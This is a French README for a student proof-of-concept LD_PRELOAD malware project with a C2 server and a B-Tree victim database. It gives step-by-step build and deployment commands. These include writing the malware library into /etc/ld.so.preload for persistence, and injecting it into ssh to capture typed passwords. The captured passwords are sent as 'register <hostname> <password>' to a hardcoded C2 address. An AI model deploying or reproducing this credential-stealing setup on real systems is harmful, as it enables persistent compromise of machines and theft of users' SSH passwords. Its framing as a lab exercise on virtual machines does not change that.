## Auteur
- Angelov Onur et Slimani Anis — ESGI 3SIJ
# README - Malware LD_PRELOAD avec Serveur C2 et Base de Données en C (B-Tree)

Ce projet est un POC complet d’un malware basé sur `LD_PRELOAD`, capable d’intercepter les identifiants SSH d’un utilisateur, de les envoyer à un serveur distant C2, et de les stocker de manière persistante dans une base de données implémentée en C à l’aide d’un B-Tree.

Pour commencer : ``git clone https://github.com/Runo76/CC1-DATABASE-ESGI``
---
```
## 📁 Structure du projet

CC1-DATABASE-ESGI/
├── server/                    # Serveur C2 (écoute, enregistre les victimes)
│   ├── server.c
│   ├── register_victim.c
│   ├── Makefile
│   └── ...
├── BTreeDB/                   # Base de données des victimes (B-Tree)
│   ├── author.md
│   ├── btree.c/.h/.o
│   ├── table.c/.h/.o
│   ├── repl.c/.h/.o
│   ├── persistence.c/.h/.o
│   ├── main.c/.o
│   ├── database.db           # Fichier de base de données persistante
│   ├── id_counter.txt        # Fichier de compteur ID auto-incrémenté
│   ├── db.txt, db/, tests/   # Données et tests
│   ├── Makefile, README.md
│   └── BTreeProject/
├── LD_PRELOAD/malware/       # Malware LD_PRELOAD (client espion)
│   ├── malware.c
│   ├── send_to_c2.c
│   ├── malware.so            # Généré après compilation
│   ├── Makefile
│   └── install_ldso_preload.sh  # Script pour activer automatiquement LD_PRELOAD
└── README.md
```

---

## 💻 VM 1 – Serveur C2 (192.168.1.20)

### 🛠️ Prérequis

- OpenSSH installé :

  sudo apt install openssh-server |
  sudo nano /etc/ssh/sshd_config |
  ### Modifier: Port 5555
  sudo systemctl enable ssh |
  |sudo systemctl start ssh
🔧 Compilation du serveur + base
______________________
Terminal 2 cd ../BTreeDB :
|make clean | make
______________________
Terminal 1 cd ~/server/CC1-DATABASE-ESGI/server:
|make clean
|make
🚀 Lancer le serveur C2

./server |
Le serveur écoute sur le port 5555
Il reçoit :

register <hostname> <password> → stocké dans la base BTree

log <hostname> <cmd> → affiché dans le terminal

## 💻 VM 2 – Malware (192.168.1.15)
🛠️ Prérequis
OpenSSH installé :

sudo apt install openssh-server
⚠️ Configuration du malware
Dans send_to_c2.c, modifier l’IP du serveur (ligne #define C2_IP "...") :


#define C2_IP "192.168.1.20" |
#define C2_PORT 5555 |
Vous pouvez aussi modifier le port C2 si nécessaire.

🔧 Compilation

cd ~/mal/CC1-DATABASE-ESGI/LD_PRELOAD/malware |
___________
 make
_______________________________
chmod +x add_to_ldso.sh |
sudo ./add_to_ldso.sh |
______________________________
Cela ajoute le chemin absolu de malware.so dans /etc/ld.so.preload
🐚 Injection automatique via LD_PRELOAD

| Fonction                         | Description                                                                                                                                               |
| -------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 🔑 Exfiltration de mot de passe  | Intercepte les entrées `password:` dans un terminal                                                                                                       |
| 📦 Envoi vers serveur C2         | Format : `register <hostname> <mdp>`                                                                                                                      |
| 🚫 Blocage de fichiers sensibles: Empêche `open()` sur sudo /etc/passwd`, `/etc/shadow`, etc. Exemple : `sudo cat /etc/passwd` → Permission denied▪️ ` cat /etc/passwd` → aussi bloqué       |
| 🧠 Injection automatique via SSH | Vous pouvez tester avec :<br>▪️ `LD_PRELOAD=./malware.so ssh name@192.168.1.xx`                                                                           |
| 💾 Persistance dans BTree        | Chaque victime est stockée dans `database.db` avec ID unique                                                                                              |
| 🔁 Injection persistante         | Automatique via `/etc/ld.so.preload`                                                                                   

🔍 Vérification de la base
Sur la VM C2 :

cd ../BTreeDB
./db
Dans la CLI :


select
Vous verrez (le register el le mdp de la connexion ssh):
ex
(1, anisdebian, 1478)
(2, onur, 1234)

🧪 Exemple de test
Lancer le serveur C2 sur VM1 :
./server


Sur la VM malware, compiler et injecter :


make |
chmod +x add_to_ldso.sh|
sudo ./add_to_ldso.sh |
Se connecter à une machine distante via SSH (ou exécuter sudo ls)
exemple : |
LD_PRELOAD=./malware.so ssh nom@192.168.1.xx (ip)


→ password: sera intercepté sur le serverc2
Vérifier la base côté serveur :

cd ../BTreeDB
./db
> select (pour parcourir l'arbre et voir ceux qui est insert)
autre commande expliqué dans la db


❌ Pour désactiver le malware

sudo rm /etc/ld.so.preload
📎 Remarques
Le fichier database.db est mis à jour automatiquement.
